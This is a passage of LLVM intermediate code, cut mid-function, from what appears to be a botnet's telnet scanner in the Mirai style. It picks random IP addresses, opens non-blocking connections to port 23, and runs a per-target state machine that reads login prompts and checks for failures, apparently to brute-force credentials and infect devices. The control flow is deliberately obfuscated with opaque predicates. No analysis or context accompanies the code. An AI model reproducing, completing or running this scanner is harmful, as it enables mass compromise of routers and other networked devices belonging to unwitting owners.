  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %23 = load i32, i32* %4, align 4
  store i32 %23, i32* %11, align 4
  %24 = call i64 @time(i64* null) #3
  %25 = call i32 @rand_cmwc()
  %26 = zext i32 %25 to i64
  %27 = xor i64 %24, %26
  %28 = trunc i64 %27 to i32
  call void @srand(i32 %28) #3
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 23) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %33 = getelementptr inbounds [8 x i8], [8 x i8]* %32, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 8, i32 4, i1 false)
  %34 = call noalias i8* @malloc(i64 1025) #3
  store i8* %34, i8** %17, align 8
  %35 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 1025, i32 1, i1 false)
  %36 = load i32, i32* %11, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %19, align 8
  %39 = alloca %struct.telstate_t, i64 %37, align 16
  %40 = bitcast %struct.telstate_t* %39 to i8*
  %41 = load i32, i32* %11, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  br label %44

; <label>:44:                                     ; preds = %62, %2
  %45 = load i32, i32* %5, align 4
  %46 = load i32, i32* %11, align 4
  %47 = icmp slt i32 %45, %46
  br i1 %47, label %48, label %65

; <label>:48:                                     ; preds = %44
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %50
  %52 = bitcast %struct.telstate_t* %51 to i8*
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 32, i32 16, i1 false)
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %54
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %55, i32 0, i32 3
  store i8 1, i8* %56, align 1
  %57 = load i8*, i8** %17, align 8
  %58 = load i32, i32* %5, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 9
  store i8* %57, i8** %61, align 8
  br label %62

; <label>:62:                                     ; preds = %48
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %5, align 4
  br label %44

; <label>:65:                                     ; preds = %44
  store i32 0, i32* %7, align 4
  br label %66

; <label>:66:                                     ; preds = %73, %65
  %67 = load i32, i32* %7, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %69
  %71 = load i8*, i8** %70, align 8
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %66
  br label %66

; <label>:74:                                     ; preds = %66
  %75 = load i32, i32* @x.75
  %76 = load i32, i32* @y.76
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %74
  %83 = load i32, i32* @x.75
  %84 = load i32, i32* @y.76
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %91

; <label>:91:                                     ; preds = %originalBBpart2136, %originalBBpart2
  br label %92

; <label>:92:                                     ; preds = %91
  store i32 0, i32* %5, align 4
  br label %93

; <label>:93:                                     ; preds = %originalBBpart2132, %92
  %94 = load i32, i32* @x.75
  %95 = load i32, i32* @y.76
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %93
  %102 = load i32, i32* %5, align 4
  %103 = load i32, i32* %11, align 4
  %104 = icmp slt i32 %102, %103
  %105 = load i32, i32* @x.75
  %106 = load i32, i32* @y.76
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %104, label %113, label %1150

; <label>:113:                                    ; preds = %originalBBpart24
  %114 = load i32, i32* @x.75
  %115 = load i32, i32* @y.76
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i32, i32* %5, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 7
  %126 = load i32, i32* %125, align 16
  %127 = icmp eq i32 %126, 0
  %128 = load i32, i32* @x.75
  %129 = load i32, i32* @y.76
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %127, label %136, label %143

; <label>:136:                                    ; preds = %originalBBpart28
  %137 = call i64 @time(i64* null) #3
  %138 = trunc i64 %137 to i32
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 7
  store i32 %138, i32* %142, align 16
  br label %143

; <label>:143:                                    ; preds = %136, %originalBBpart28
  %144 = load i32, i32* @x.75
  %145 = load i32, i32* @y.76
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %143
  %152 = load i32, i32* %5, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 2
  %156 = load i8, i8* %155, align 8
  %157 = zext i8 %156 to i32
  %158 = load i32, i32* @x.75
  %159 = load i32, i32* @y.76
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  switch i32 %157, label %1130 [
    i32 0, label %166
    i32 1, label %366
    i32 2, label %481
    i32 3, label %591
    i32 4, label %652
    i32 5, label %730
    i32 6, label %791
    i32 7, label %1003
  ]

; <label>:166:                                    ; preds = %originalBBpart212
  %167 = load i32, i32* %5, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 3
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 1
  br i1 %173, label %174, label %194

; <label>:174:                                    ; preds = %166
  %175 = load i32, i32* %5, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 9
  %179 = load i8*, i8** %178, align 8
  store i8* %179, i8** %20, align 8
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %181
  %183 = bitcast %struct.telstate_t* %182 to i8*
  call void @llvm.memset.p0i8.i64(i8* %183, i8 0, i64 32, i32 16, i1 false)
  %184 = load i8*, i8** %20, align 8
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 9
  store i8* %184, i8** %188, align 8
  %189 = call i32 @GIP()
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 1
  store i32 %189, i32* %193, align 4
  br label %274

; <label>:194:                                    ; preds = %166
  %195 = load i32, i32* %5, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 3
  %199 = load i8, i8* %198, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 0
  br i1 %201, label %202, label %273

; <label>:202:                                    ; preds = %194
  %203 = load i32, i32* %5, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 5
  %207 = load i8, i8* %206, align 1
  %208 = add i8 %207, 1
  store i8 %208, i8* %206, align 1
  %209 = load i32, i32* %5, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 4
  %213 = load i8, i8* %212, align 2
  %214 = add i8 %213, 1
  store i8 %214, i8* %212, align 2
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 5
  %219 = load i8, i8* %218, align 1
  %220 = zext i8 %219 to i64
  %221 = icmp eq i64 %220, 4
  br i1 %221, label %222, label %227

; <label>:222:                                    ; preds = %202
  %223 = load i32, i32* %5, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 3
  store i8 1, i8* %226, align 1
  br label %1131

; <label>:227:                                    ; preds = %202
  %228 = load i32, i32* @x.75
  %229 = load i32, i32* @y.76
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %227
  %236 = load i32, i32* %5, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 4
  %240 = load i8, i8* %239, align 2
  %241 = zext i8 %240 to i64
  %242 = icmp eq i64 %241, 4
  %243 = load i32, i32* @x.75
  %244 = load i32, i32* @y.76
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %242, label %251, label %272

; <label>:251:                                    ; preds = %originalBBpart216
  %252 = load i32, i32* @x.75
  %253 = load i32, i32* @y.76
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %251
  %260 = load i32, i32* %5, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 3
  store i8 1, i8* %263, align 1
  %264 = load i32, i32* @x.75
  %265 = load i32, i32* @y.76
  %266 = sub i32 %264, 1
  %267 = mul i32 %264, %266
  %268 = urem i32 %267, 2
  %269 = icmp eq i32 %268, 0
  %270 = icmp slt i32 %265, 10
  %271 = or i1 %269, %270
  br i1 %271, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %1131

; <label>:272:                                    ; preds = %originalBBpart216
  br label %273

; <label>:273:                                    ; preds = %272, %194
  br label %274

; <label>:274:                                    ; preds = %273, %174
  %275 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %275, align 4
  %276 = call zeroext i16 @htons(i16 zeroext 23) #10
  %277 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %276, i16* %277, align 2
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %279 = getelementptr inbounds [8 x i8], [8 x i8]* %278, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %279, i8 0, i64 8, i32 4, i1 false)
  %280 = load i32, i32* %5, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %281
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %282, i32 0, i32 1
  %284 = load i32, i32* %283, align 4
  %285 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %286 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %285, i32 0, i32 0
  store i32 %284, i32* %286, align 4
  %287 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %288 = load i32, i32* %5, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 0
  store i32 %287, i32* %291, align 16
  %292 = load i32, i32* %5, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %293
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 16
  %297 = icmp eq i32 %296, -1
  br i1 %297, label %298, label %315

; <label>:298:                                    ; preds = %274
  %299 = load i32, i32* @x.75
  %300 = load i32, i32* @y.76
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %298
  %307 = load i32, i32* @x.75
  %308 = load i32, i32* @y.76
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %1131

; <label>:315:                                    ; preds = %274
  %316 = load i32, i32* @x.75
  %317 = load i32, i32* @y.76
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %315
  %324 = load i32, i32* %5, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = call i32 (i32, i32, ...) @fcntl(i32 %333, i32 3, i8* null)
  %335 = or i32 %334, 2048
  %336 = call i32 (i32, i32, ...) @fcntl(i32 %328, i32 4, i32 %335)
  %337 = load i32, i32* %5, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 0
  %341 = load i32, i32* %340, align 16
  %342 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %343 = call i32 @connect(i32 %341, %struct.sockaddr* %342, i32 16)
  %344 = icmp eq i32 %343, -1
  %345 = load i32, i32* @x.75
  %346 = load i32, i32* @y.76
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %344, label %353, label %361

; <label>:353:                                    ; preds = %originalBBpart228
  %354 = call i32* @__errno_location() #10
  %355 = load i32, i32* %354, align 4
  %356 = icmp ne i32 %355, 115
  br i1 %356, label %357, label %361

; <label>:357:                                    ; preds = %353
  %358 = load i32, i32* %5, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %359
  call void @reset_telstate(%struct.telstate_t* %360)
  br label %365

; <label>:361:                                    ; preds = %353, %originalBBpart228
  %362 = load i32, i32* %5, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %363
  call void @advance_state(%struct.telstate_t* %364, i32 1)
  br label %365

; <label>:365:                                    ; preds = %361, %357
  br label %1130

; <label>:366:                                    ; preds = %originalBBpart212
  br label %367

; <label>:367:                                    ; preds = %366
  %368 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %369 = getelementptr inbounds [16 x i64], [16 x i64]* %368, i64 0, i64 0
  %370 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %369) #3, !srcloc !6
  %371 = extractvalue { i64, i64* } %370, 0
  %372 = extractvalue { i64, i64* } %370, 1
  %373 = trunc i64 %371 to i32
  store i32 %373, i32* %21, align 4
  %374 = ptrtoint i64* %372 to i64
  %375 = trunc i64 %374 to i32
  store i32 %375, i32* %22, align 4
  br label %376

; <label>:376:                                    ; preds = %367
  br label %377

; <label>:377:                                    ; preds = %376
  %378 = load i32, i32* %5, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %379
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %380, i32 0, i32 0
  %382 = load i32, i32* %381, align 16
  %383 = srem i32 %382, 64
  %384 = zext i32 %383 to i64
  %385 = shl i64 1, %384
  %386 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %387 = load i32, i32* %5, align 4
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %388
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %389, i32 0, i32 0
  %391 = load i32, i32* %390, align 16
  %392 = sdiv i32 %391, 64
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds [16 x i64], [16 x i64]* %386, i64 0, i64 %393
  %395 = load i64, i64* %394, align 8
  %396 = or i64 %395, %385
  store i64 %396, i64* %394, align 8
  %397 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %397, align 8
  %398 = load i32, i32* %3, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %399, i64* %400, align 8
  %401 = load i32, i32* %5, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %402
  %404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %403, i32 0, i32 0
  %405 = load i32, i32* %404, align 16
  %406 = add nsw i32 %405, 1
  %407 = call i32 @select(i32 %406, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %407, i32* %6, align 4
  %408 = load i32, i32* %6, align 4
  %409 = icmp eq i32 %408, 1
  br i1 %409, label %410, label %458

; <label>:410:                                    ; preds = %377
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %411 = load i32, i32* %5, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 0
  %415 = load i32, i32* %414, align 16
  %416 = bitcast i32* %15 to i8*
  %417 = call i32 @getsockopt(i32 %415, i32 1, i32 4, i8* %416, i32* %14) #3
  %418 = load i32, i32* %15, align 4
  %419 = icmp ne i32 %418, 0
  br i1 %419, label %420, label %440

; <label>:420:                                    ; preds = %410
  %421 = load i32, i32* @x.75
  %422 = load i32, i32* @y.76
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %420
  %429 = load i32, i32* %5, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %430
  call void @reset_telstate(%struct.telstate_t* %431)
  %432 = load i32, i32* @x.75
  %433 = load i32, i32* @y.76
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %457

; <label>:440:                                    ; preds = %410
  %441 = load i32, i32* %5, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %442
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 16
  %446 = load i32, i32* %5, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %447
  %449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %448, i32 0, i32 0
  %450 = load i32, i32* %449, align 16
  %451 = call i32 (i32, i32, ...) @fcntl(i32 %450, i32 3, i8* null)
  %452 = and i32 %451, -2049
  %453 = call i32 (i32, i32, ...) @fcntl(i32 %445, i32 4, i32 %452)
  %454 = load i32, i32* %5, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %455
  call void @advance_state(%struct.telstate_t* %456, i32 2)
  br label %457

; <label>:457:                                    ; preds = %440, %originalBBpart232
  br label %1131

; <label>:458:                                    ; preds = %377
  %459 = load i32, i32* %6, align 4
  %460 = icmp eq i32 %459, -1
  br i1 %460, label %461, label %465

; <label>:461:                                    ; preds = %458
  %462 = load i32, i32* %5, align 4
  %463 = sext i32 %462 to i64
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %463
  call void @reset_telstate(%struct.telstate_t* %464)
  br label %1131

; <label>:465:                                    ; preds = %458
  br label %466

; <label>:466:                                    ; preds = %465
  %467 = load i32, i32* %5, align 4
  %468 = sext i32 %467 to i64
  %469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %468
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %469, i32 0, i32 7
  %471 = load i32, i32* %470, align 16
  %472 = add i32 %471, 5
  %473 = zext i32 %472 to i64
  %474 = call i64 @time(i64* null) #3
  %475 = icmp slt i64 %473, %474
  br i1 %475, label %476, label %480

; <label>:476:                                    ; preds = %466
  %477 = load i32, i32* %5, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %478
  call void @reset_telstate(%struct.telstate_t* %479)
  br label %480

; <label>:480:                                    ; preds = %476, %466
  br label %1130

; <label>:481:                                    ; preds = %originalBBpart212
  %482 = load i32, i32* @x.75
  %483 = load i32, i32* @y.76
  %484 = sub i32 %482, 1
  %485 = mul i32 %482, %484
  %486 = urem i32 %485, 2
  %487 = icmp eq i32 %486, 0
  %488 = icmp slt i32 %483, 10
  %489 = or i1 %487, %488
  br i1 %489, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %481
  %490 = load i32, i32* %5, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 0
  %494 = load i32, i32* %493, align 16
  %495 = load i32, i32* %3, align 4
  %496 = load i32, i32* %5, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 9
  %500 = load i8*, i8** %499, align 8
  %501 = call i32 @read_until_response(i32 %494, i32 %495, i8* %500, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %502 = icmp ne i32 %501, 0
  %503 = load i32, i32* @x.75
  %504 = load i32, i32* @y.76
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %502, label %511, label %544

; <label>:511:                                    ; preds = %originalBBpart236
  %512 = load i32, i32* @x.75
  %513 = load i32, i32* @y.76
  %514 = sub i32 %512, 1
  %515 = mul i32 %512, %514
  %516 = urem i32 %515, 2
  %517 = icmp eq i32 %516, 0
  %518 = icmp slt i32 %513, 10
  %519 = or i1 %517, %518
  br i1 %519, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %511
  %520 = load i32, i32* %5, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %521
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %522, i32 0, i32 9
  %524 = load i8*, i8** %523, align 8
  %525 = call i32 @contains_fail(i8* %524)
  %526 = icmp ne i32 %525, 0
  %527 = load i32, i32* @x.75
  %528 = load i32, i32* @y.76
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
